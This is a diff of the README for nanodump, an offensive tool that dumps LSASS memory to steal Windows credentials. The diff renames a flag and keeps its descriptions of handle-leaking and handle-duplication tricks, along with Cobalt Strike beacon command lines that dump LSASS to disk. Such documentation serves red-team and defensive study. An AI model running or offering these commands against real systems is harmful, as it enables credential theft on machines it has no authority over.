@@ -88,14 +88,14 @@ Create a handle to LSASS with `PROCESS_CREATE_PROCESS` access and then create a 
 List all the handles in the system and look for an existing handle to LSASS. If found, duplicate it and access LSASS with it. This eliminates the need to open a new handle to LSASS directly.  
 *(Be aware that there is no guarantee to find such handle)*
 
-#### --seclogon -sl
+#### --malseclogon -ms
 Leak a handle to LSASS by abusing SecLogon with `CreateProcessWithLogonW`. This eliminates the need to open a new handle to LSASS directly.  
 When this option is used, errors while analyzing the minidump are to be expected. Use the latest version of pypykatz.  
 **If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!**
 
 #### --binary -v < path >
 Path to a binary such as `C:\Windows\notepad.exe`.  
-This option is used exclusively with `--seclogon` and `--dup`. If used, nanodump will create that process and use MalSecLogon to leak an LSASS handle in it. Then, it will duplicate that handle and use it to access LSASS.  
+This option is used exclusively with `--malseclogon` and `--dup`. If used, nanodump will create that process and use MalSecLogon to leak an LSASS handle in it. Then, it will duplicate that handle and use it to access LSASS.  
 The created process is then terminated automatically.
 
 
@@ -108,12 +108,12 @@ beacon> nanodump --fork --write C:\lsass.dmp
 
 Use MalSecLogon to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
 ```
-beacon> nanodump --seclogon --dup --fork --binary C:\Windows\notepad.exe --valid
+beacon> nanodump --malseclogon --dup --fork --binary C:\Windows\notepad.exe --valid
 ```
 
 Get a handle with MalSecLogon, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):
 ```
-beacon> nanodump --seclogon --fork --valid --write C:\Windows\Temp\lsass.dmp
+beacon> nanodump --malseclogon --fork --valid --write C:\Windows\Temp\lsass.dmp
 ```
 
 Download the dump with an invalid signature (default):
